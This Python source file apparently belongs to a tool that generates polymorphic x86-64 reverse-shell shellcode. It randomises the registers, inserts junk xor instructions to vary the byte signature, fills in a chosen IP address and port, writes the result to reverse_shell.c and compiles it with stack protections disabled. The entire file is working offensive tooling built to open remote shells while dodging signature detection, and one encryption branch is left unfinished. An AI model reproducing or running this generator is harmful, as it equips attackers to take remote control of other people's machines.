from os import system
from json import load
from random import randint
from pathlib import Path

# Path of the tool and resources
toolpath = Path(__file__).absolute().parent
instructions = toolpath / 'resources/instructions.json'
c_template = toolpath / 'resources/template.c'

def regreplace(preshellcode: str) -> str:
    
    """
    Place two random registers between r8 to r15 that will hold the fd (file descriptor)

    Args:
        preshellcode (str): Base shellcode string

    Returns:
        str: Return the base shellcode modified with the registers
    """

    file = open(instructions)
    data = load(file)

    #al 33 dict
    al_33_dict = data["instructions"].get("al_33")
    al_33_keys = list(al_33_dict.keys())
    
    #dil 2 dict
    dil_2_dict = data["instructions"].get("dil_2")
    dil_2_keys = list(dil_2_dict.keys())

    #sil 1 dict
    sil_1_dict = data["instructions"].get("sil_1")
    sil_1_keys = list(sil_1_dict.keys())
    
    # mov reg rax dictionnary and its keys
    # all dictionaries have the same keys
    mov_reg_rax_dict = data["instructions"].get("mov_reg_rax")
    mov_reg_rax_keys = list(mov_reg_rax_dict.keys())
    
    # push dictionary and its keys
    push_dict = data["instructions"].get("push")
    
    # xor dictionary and its keys
    xor_dict = data["instructions"].get("xor")

    # mov rdi reg dictionnary and its keys
    mov_reg_rdi_dict = data["instructions"].get("mov_reg_rdi")

    # mov reg sh dictionnary and its keys
    mov_reg_sh_dict = data["instructions"].get("mov_reg_sh")


    # random al to 33
    randalindex = randint(0, len(al_33_keys) - 1)
    randal = al_33_keys[randalindex]

    # random dil to 2
    randilindex = randint(0, len(dil_2_keys) -1)
    randil = dil_2_keys[randilindex]

    # random sil to 1
    randsilindex = randint(0, len(sil_1_keys) -1)
    randsil = sil_1_keys[randsilindex]

    # choose randomly a registry to use to handle the fd
    # choose another one that will be push on the stack before syscall of sh
    
    # looping the reg2 choice and test if it's the same as reg1
    while True:
        reg1randindex = randint(0, len(mov_reg_rax_keys) - 1)
        reg1 = mov_reg_rax_keys[reg1randindex]
        reg2randindex = randint(0, len(mov_reg_rax_keys) - 1)
        reg2 = mov_reg_rax_keys[reg2randindex]
        if reg1 != reg2 and reg1 not in ['r11', 'r13', 'r14']:
            break
    
    preshellcode = preshellcode.replace('b021', al_33_dict.get(randal))
    preshellcode = preshellcode.replace('40b702', dil_2_dict.get(randil))
    preshellcode = preshellcode.replace('40b601', sil_1_dict.get(randsil))
    preshellcode = preshellcode.replace('4989c7', mov_reg_rax_dict.get(reg1))
    preshellcode = preshellcode.replace('4c89ff', mov_reg_rdi_dict.get(reg1))
    preshellcode = preshellcode.replace('4d31ff', xor_dict.get(reg1))
    preshellcode = preshellcode.replace('4157', push_dict.get(reg1))
    preshellcode = preshellcode.replace('49bf2f2f62696e', mov_reg_sh_dict.get(reg1))
    preshellcode = preshellcode.replace('4d31f6', xor_dict.get(reg2))
    preshellcode = preshellcode.replace('4156', push_dict.get(reg2))

    # return a dictionary that will hold the preshellcode modified and the two registry put
    # it will be use to remove them from oprand function to remove the reg choosed from xor operation

    return {'preshellcode': preshellcode, 'reg1': reg1, 'reg2': reg2}

def oprand(preshellcode_reg1_reg2: dict, xor_nb: int) -> str:
    """
    Put random dead code (xor) in the shellcode string

    Args:
        preshellcode_reg1_reg2 (dict): Dict that hold the shellcode string and the registry that don't have to be xor
        xor_nb (int): Number of xor operation to put

    Returns:
        str: Shellcode modified with xor operations
    """

    # retrieve the preshellcode modified from dict returned by regreplace()
    preshellcode = preshellcode_reg1_reg2.get('preshellcode')

    # craft a list that contains the registry that don't have to be xor
    no_xor_reg = [preshellcode_reg1_reg2.get('reg1'), preshellcode_reg1_reg2.get('reg2')]
    file = open(instructions)
    data = load(file)

    # dictionaries and keys 

    # xor dictionnary and its keys
    xor_dict = data["instructions"].get("xor")
    
    # remove registry choosed in regreplac() from xor_dict
    for reg in no_xor_reg:
        xor_dict.pop(reg)

    xor_keys = list(xor_dict.keys())

    # initiate the counter of xor put in the shellcode's blocs
    randxor_putted = 0

    blocs = preshellcode.split('0f05')
    if blocs[-1] == '':
        blocs.pop()

    randxor = ""
    while randxor_putted < xor_nb:
        # generate a random index that will be use to retrieve a random element of the xor_dict
        xorandindex = randint(0, len(xor_keys) - 1)
        blocsrandindex = randint(0, len(blocs) - 1)
        randxor = xor_dict[xor_keys[xorandindex]]

        # retrieve a random xor_dict element that will be put randomly in the shellcode blocs N times (random)
        blocs[blocsrandindex] =  randxor + blocs[blocsrandindex]
        randxor_putted += 1

    # rebuild the baseshell string with syscall opcodes
    baseshell_modified = '0f05'.join(blocs) + '0f05'
    return baseshell_modified

def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int, outfile: str, iscrypt: bool, key:str) -> str:
    """
    Function that create the shellcode.
    This function call regreplace() and oprand() to do it.
    Then it saves the shellcode in a C file.

    Args:
        baseshell (str): Default baseshell value (see -> main.py)
        ipbloc (str): hexadecimal string  of the ip bloc instructions
        portbloc (str): hexadecimal string of the port bloc instructions
        xor_nb (int): Number of xor operation to put
    """

    shellcode_dict = ""
    random_baseshell = ""

    if iscrypt :
        # à faire les xor et le dictionnaire pour le iscrypt
        print("FAIRE LES FONCTION DE XOR ET DICO POUR LE CRYPT SHELL ET GENERER LE LISTENER")
    else:
        # replace the registry to handle fd
        shellcode_dict = regreplace(baseshell)

        # append dead code to the shellcode
        random_baseshell = oprand(shellcode_dict, xor_nb)

    # put the ip and port bloc for the socket struct
    delimvalues = {'ip': ipbloc, 'port': portbloc}
    
    for key in delimvalues.keys():
        value = delimvalues.get(key)
        random_baseshell = random_baseshell.replace(key, value)

    # create the shellcode string
    shellcode = '\\x' + '\\x'.join(random_baseshell[i:i + 2] for i in range(0, len(random_baseshell), 2))
    

    # save the shellcode in reverse_shell.c and shellcode.txt so that it can be compiled after of use in another purpose
    cfile = 'reverse_shell.c'
    ccode = open(c_template, 'r').read()
    ccode = ccode.replace('0', repr(shellcode).replace("'", '"'))

    # detection null byte
    for i in range(0,len(baseshell), 2):
        if baseshell[i]=="0" and baseshell[i+1]=="0":
            print("==============================================================")
            print("||              [!] WARNING : NULLBYTE DETECTED             ||")
            print("==============================================================\n")
            break

    with open(cfile, 'w') as out:
        out.write(ccode.replace(r'\\', '\\'))
    with open(outfile, 'w') as outshellcode:
        outshellcode.write(shellcode)

    return shellcode
    

def compile():
    """
    Compile the C file
    """

    system(f'gcc reverse_shell.c -o reverse_shell -fno-stack-protector -z execstack -no-pie')
